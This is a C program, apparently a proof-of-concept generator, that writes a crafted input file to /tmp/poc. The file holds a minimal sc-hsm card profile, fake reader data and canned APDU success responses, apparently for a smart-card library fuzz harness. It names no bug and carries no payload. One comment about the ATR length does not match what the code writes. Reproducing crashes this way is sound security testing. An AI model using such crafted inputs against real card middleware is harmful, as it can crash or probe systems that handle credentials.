#include <stdio.h>
#include <stdlib.h>
#include <string.h>

int main(void) {
    FILE *f = fopen("/tmp/poc", "wb");
    if (!f) { perror("fopen"); return 1; }

    // Part 1: Valid scconf profile (null-terminated)
    // Must include [card], [newfile], [tokeninfo] blocks
    fprintf(f, "[card]\n");
    fprintf(f, "driver = sc-hsm\n");
    fprintf(f, "[newfile]\n");
    fprintf(f, "type = data\n");
    fprintf(f, "file-id = 0x0001\n");
    fprintf(f, "[tokeninfo]\n");
    fprintf(f, "label = test\n");
    fputc(0x00, f); // Null separator

    // Part 2: Reader binary data
    // ATR: 3 bytes length + 3 bytes ATR
    fputc(0x03, f); // ATR length
    fputc(0x3B, f); // ATR byte 1
    fputc(0x00, f); // ATR byte 2
    fputc(0x00, f); // ATR byte 3

    // Driver name: null-terminated
    fprintf(f, "sc-hsm");
    fputc(0x00, f);

    // APDU responses: enough to cover initialization sequence
    // Each response is 2 bytes (SW1, SW2) = 0x90 0x00 for success
    // We need responses for SELECT FILE, READ BINARY, UPDATE BINARY, etc.
    // Provide 20 pairs to be safe
    for (int i = 0; i < 20; i++) {
        fputc(0x90, f); // SW1
        fputc(0x00, f); // SW2
    }

    fclose(f);
    return 0;
}